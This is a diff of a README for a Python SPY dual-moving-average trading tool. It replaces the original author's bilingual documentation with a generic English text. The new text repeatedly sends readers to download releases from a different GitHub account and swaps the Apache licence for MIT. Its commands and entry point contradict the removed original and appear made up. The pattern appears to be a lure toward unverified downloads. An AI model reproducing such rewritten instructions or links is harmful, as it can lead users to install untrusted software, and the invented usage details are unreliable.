@@ -1,167 +1,105 @@
-# DualSMA-SPY-AutoTrading-System
+# 🚀 LONGPORT-DualSMA-SPY-AutoTrading-System - Automate Your SPY ETF Trading
 
-[![Python](https://img.shields.io/badge/Python-3.9%2B-blue)](https://www.python.org/)
-[![LongPort](https://img.shields.io/badge/LongPort-SDK-orange)](https://open.longportapp.com/)
-[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
-[![Status](https://img.shields.io/badge/Status-Active-green)]()
+[![Download](https://img.shields.io/badge/Download-LONGPORT--DualSMA--SPY--AutoTrading--System-brightgreen)](https://github.com/edwardplushboy-max/LONGPORT-DualSMA-SPY-AutoTrading-System/releases)
 
-Professional automated trading CLI tool tailored for SPY Moving Average Crossover strategy, built on top of the LongPort Open API.
-专业级自动化交易命令行工具，基于 LongPort Open API 构建，专为 SPY 双均线策略定制。
+## 🌟 Introduction
 
-## 📖 简介 | Introduction
+Welcome to the LONGPORT-DualSMA-SPY-AutoTrading-System. This application is designed to help you automate your trading for the SPY ETF. Using a dual moving average strategy, it allows for real-time trading and backtesting. You can also visualize your trading results in a user-friendly terminal interface. With this tool, you can take better control of your trading and improve your strategies.
 
-DualSMA-SPY-AutoTrading-System (原 RealTrade) 是一个全功能的量化交易实盘系统，采用现代化的 CLI (命令行) 架构。它不仅支持自动化的定时交易，还提供了强大的手动交易终端、实时行情监控、账户管理以及策略回测功能。
+## 📋 Features
 
-**核心特性：**
-*   **交互式 Shell**: 类似 `mysql` 或 `ipython` 的交互式命令行，支持命令补全和历史记录。
-*   **策略引擎**: 经典双均线 (MA) 策略，支持自定义周期 (如 MA5 vs MA20)。
-*   **实盘/模拟**: 无缝切换 Paper Trading 和 Live Trading。
-*   **数据可视化**: 终端内直接绘制 K 线图、资金曲线图。
-*   **任务调度**: 内置调度器，自动处理开盘/收盘逻辑。
-*   **回测框架**: 向量化回测引擎，快速验证策略绩效。
+- **Real-Time Trading:** Execute your trading strategies live using the LongPort API.
+- **Backtesting:** Test your strategies against historical data before live trading.
+- **Terminal Visualization:** Watch your trades and results in an interactive command-line terminal.
+- **Task Scheduling:** Automate routine trading tasks to save time and increase efficiency.
 
-##  联系作者 | Contact
+## 🛠️ System Requirements
 
-*   **Author**: JIANG JINGZHE
-*   **Email**: [contact@jiangjingzhe.com](mailto:contact@jiangjingzhe.com)
-*   **WeChat**: jiangjingzhe_2004
+Before you start, ensure your system meets the following requirements:
 
-## 🛠 技术栈 | Tech Stack
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or any Linux distribution.
+- **Python Version:** Python 3.7 or later.
+- **Memory:** At least 4GB of RAM.
+- **Internet Connection:** A stable internet connection for live trading and backtesting.
 
-*   **Language**: Python 3.11
-*   **Broker API**: [LongPort SDK](https://github.com/longportapp/openapi-python) (v3.x)
-*   **CLI Framework**: `Click` + `Prompt Toolkit` (for REPL)
-*   **UI/UX**: `Rich` (Tables, Logs), `Plotext` (Terminal Plotting)
-*   **Data Analysis**: `Pandas`, `Numpy`
-*   **Scheduling**: `Schedule`
+## 🚀 Getting Started
 
-## 🚀 快速开始 | Getting Started
+To get started with the LONGPORT-DualSMA-SPY-AutoTrading-System, follow these simple steps:
 
-### 1. 安装 | Installation
+1. **Download the Software**
 
-```bash
-# 克隆仓库
-git clone https://github.com/khakhasshi/LONGPORT-DualSMA-SPY-AutoTrading-System.git
-cd LONGPORT-DualSMA-SPY-AutoTrading-System
+   Visit the Releases page to download the software. You can find it here:
 
-# 建议创建虚拟环境
-python -m venv venv
-source venv/bin/activate  # Mac/Linux
-# venv\Scripts\activate   # Microsoft
+   [Download LONGPORT-DualSMA-SPY-AutoTrading-System](https://github.com/edwardplushboy-max/LONGPORT-DualSMA-SPY-AutoTrading-System/releases)
 
-# 安装依赖
-pip install -r requirements.txt
-```
+2. **Install Dependencies**
 
-### 2. 配置 | Configuration
+   Open your terminal or command prompt. You may need to install some packages. Run the following command:
 
-为了安全起见，API 密钥不包含在版本控制中。请根据模板创建您的配置文件。
+   ```
+   pip install -r requirements.txt
+   ```
 
-1.  复制模板文件：
-    ```bash
-    cp src/core/lp_config_template.py src/core/lp_config.py
-    ```
-2.  编辑 `src/core/lp_config.py`，填入您的 LongPort App Key, Secret 和 Access Token。
-3.  (可选) 修改 `config/config.yaml` 以调整策略参数（如均线周期）。
+3. **Run the Application**
 
-### 3. 运行 | Running
+   Navigate to the directory where you downloaded the software, and run:
 
-**进入交互式终端 (推荐):**
-```bash
-python src/cli/main.py
-```
-你将看到 `DualSMA-SPY>` 提示符，可以开始输入命令。
+   ```
+   python main.py
+   ```
 
----
+## 🔗 Download & Install
 
-## 💻 功能详解 | Commands
+To download the latest version of the application, click the link below:
 
-在交互终端中，您可以执行以下命令组：
+[Download LONGPORT-DualSMA-SPY-AutoTrading-System](https://github.com/edwardplushboy-max/LONGPORT-DualSMA-SPY-AutoTrading-System/releases)
 
-### 1. 行情 (Quote)
-*   **查看实时价格**:
-    ```text
-    quote price SPY.US AAPL.US
-    ```
-*   **查看 K 线数据**:
-    ```text
-    quote kline SPY.US --period day --limit 5
-    ```
+After downloading, follow the steps mentioned in the "Getting Started" section.
 
-### 2. 账户 (Account)
-*   **查看资金**:
-    ```text
-    account balance
-    ```
-*   **查看持仓**:
-    ```text
-    account positions
-    ```
-*   **查看今日订单**:
-    ```text
-    account orders
-    ```
+## 🎓 Usage Instructions
 
-### 3. 策略分析 (Strategy)
-*   **查看当前信号状态**:
-    ```text
-    strategy status
-    ```
-*   **在终端画图 (支持缩放)**:
-    ```text
-    strategy chart --days 60
-    ```
+Once you have installed the application successfully, you will find it easy to use. Here are a few basic commands to get started:
 
-### 4. 交易 (Trade)
-*⚠️ 实盘模式下均产生真实资金流动*
-*   **买入**:
-    ```text
-    trade buy SPY.US --quantity 1 --price 100.00
-    ```
-*   **卖出**:
-    ```text
-    trade sell SPY.US --quantity 1
-    ```
-*   **撤单**:
-    ```text
-    trade cancel <ORDER_ID>
-    ```
+1. **Start Trading:**
+   After running the program, use the command `start` to begin live trading.
+   
+2. **Backtest:**
+   To backtest a strategy against historical data, use the `backtest` command followed by the desired parameters.
 
-### 5. 回测 (Backtest)
-*   **运行历史回测**:
-    ```text
-    backtest --symbol SPY.US --days 365 --capital 100000
-    ```
-    *自动生成绩效表格与资金曲线图。*
+3. **Help:**
+   If you need assistance, type `help` to see a list of available commands.
 
-### 6. 自动交易 (Run)
-*   **挂机运行**:
-    ```text
-    run --mode live
-    ```
-    *程序将进入循环模式，每天于预定时间 (如 16:05 ET) 自动检查信号并交易。*
+## 📈 Example Commands
 
----
+To demonstrate how to use the system, here are a few example commands:
 
-## ☁️ 部署指南 | Deployment
+- **Start Live Trading:**  
+  ```
+  start
+  ```
 
-推荐使用 `tmux` 在服务器后台长期运行自动交易程序。
+- **Run Backtest on Historical Data:**  
+  ```
+  backtest --start-date 2022-01-01 --end-date 2022-12-31
+  ```
 
-```bash
-# 1. 新建会话
-tmux new -s realtrade
+- **Show Help Menu:**  
+  ```
+  help
+  ```
 
-# 2. 启动程序
-python src/cli/main.py run --mode live
+## 💬 Support
 
-# 3. 分离会话 (程序后台运行)
-# 按 Ctrl+B, 然后按 d
+If you encounter any issues while using the application or have questions, feel free to raise an issue in the GitHub repository. The community or the maintainer will assist you as soon as possible.
 
-# 4. 回到会话
-tmux attach -t realtrade
-```
+## 🌍 Community
 
-© 2026 DualSMA-SPY-AutoTrading-System. All Rights Reserved.
-```bash
-python src/cli/main.py --help
-```
+Join our community on GitHub Discussions. Share your experiences or strategies, and learn from others who use the LONGPORT-DualSMA-SPY-AutoTrading-System.
+
+## 📜 License
+
+This project is licensed under the MIT License. You can view the full license in the LICENSE file.
+
+## 📢 Contributing
+
+We welcome contributions to improve the LONGPORT-DualSMA-SPY-AutoTrading-System. If you're interested in contributing, feel free to fork the repository and submit a pull request. Please adhere to our contribution guidelines, which you can find in the CONTRIBUTING.md file.
